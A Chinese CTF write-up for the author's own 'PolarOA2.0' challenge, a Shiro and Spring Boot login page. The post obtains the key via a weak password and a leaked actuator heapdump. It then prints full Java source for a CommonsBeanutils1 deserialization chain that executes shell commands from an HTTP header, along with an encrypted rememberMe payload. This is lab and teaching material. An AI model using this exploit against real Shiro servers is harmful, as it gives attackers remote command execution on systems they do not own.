---
title: 记一次CTF出题之PolarOA2.0_WP篇
date: 2024-01-30 18:53:00 +0800
img_path: /
categories: [CTF, CTF出题记录]
tags: [CTF, CTF出题记录]   
---

# WEB-PolarOA2.0

## 一、查看题目信息

题目给出一个登录界面，跟前`PolarOA`题目我们知道考察`shiro`相关利用方式。

![image-20240131200522609](assets/image-20240131200522609.png)



## 二、题目分析

使用工具探测到`shiro`框架，尝试爆破并未爆破出`Key`，考虑使用的高版本`shiro`，可尝试使用其他方式获取`key`。

![image-20240131200955626](assets/image-20240131200955626.png)

考虑是`SpringBoot`项目，可尝试是否存在端点泄露。

访问`http://url/actuator`，跳转到登录界面，考虑是做了访问控制。

通过`fuzz`登录界面可测试出弱口令 `admin`：`admin123`

![image-20240131201814666](assets/image-20240131201814666.png)

登录成功在次尝试测试确实存在端点泄露：`/actuator/env`、`/actuator/heapdump`。

![image-20240131202024987](assets/image-20240131202024987.png)

重点关注`/actuator/heapdump`因为`Spring`中的`heapdump`文件是从`JVM`虚拟机内存导出的，所以可在`heapdump`文件中找到我们需要的`Key`访问后即可下载`heapdump`文件。

![image-20240131202706406](assets/image-20240131202706406.png)

接下来就可以借助工具分析出`heapdump`的`key`：https://github.com/whwlsfb/JDumpSpider

![image-20240131202905482](assets/image-20240131202905482.png)

探测`key`

![image-20240131203103097](assets/image-20240131203103097.png)

探测利用链发现无可利用链路，考虑是跟`PolarOA`题目一样做了限制，测试不难发现`rememberMe`字段的内容不能超过`3000`个字符。

![image-20240131203132666](assets/image-20240131203132666.png)

还是使用`CB1`链子生成`payload`（`shiro`依赖CB）：

```java
package ysoserial.shiropoc;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import ysoserial.payloads.util.Reflections;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;


public class POC {
    public static void main(String[] args) throws Exception {
        final TemplatesImpl templates = getTemplate();

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(comparator, "property", "outputProperties");

        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;
        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(queue);
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode(CodecSupport.toBytes("TQyRWFqr5ssSr0MA6M17fA=="));//shiro默认密钥
        byte[] bytes = byteArrayOutputStream.toByteArray();
        System.out.println(aes.encrypt(bytes, key));
    }
    public static CtClass genPayloadForLinux2() throws NotFoundException, CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("A");
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public B() throws Exception {\n" +
            "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
            "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
            "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
            "                String[] cmd =  new String[]{\"sh\", \"-c\", httprequest.getHeader(\"C\")};\n" +
            "                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
            "                httpresponse.getWriter().write(new String(result));\n" +
            "                httpresponse.getWriter().flush();\n" +
            "                httpresponse.getWriter().close();\n" +
            "        }", clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }
    public static TemplatesImpl getTemplate() throws Exception {
        CtClass clz = genPayloadForLinux2();
        TemplatesImpl obj = new TemplatesImpl();
        Reflections.setFieldValue(obj, "_bytecodes", new byte[][]{clz.toBytecode()});
        Reflections.setFieldValue(obj, "_name", "a");
        Reflections.setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        return obj;
    }
}
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
```



## 三、漏洞利用

运行`poc`生成`payload`并传入`Cookie`的`rememberMe`（`Cookie: rememberMe=xxxxxxx`），同时编辑`C`字段为所需执行的命令。

![image-20240131203500028](assets/image-20240131203500028.png)
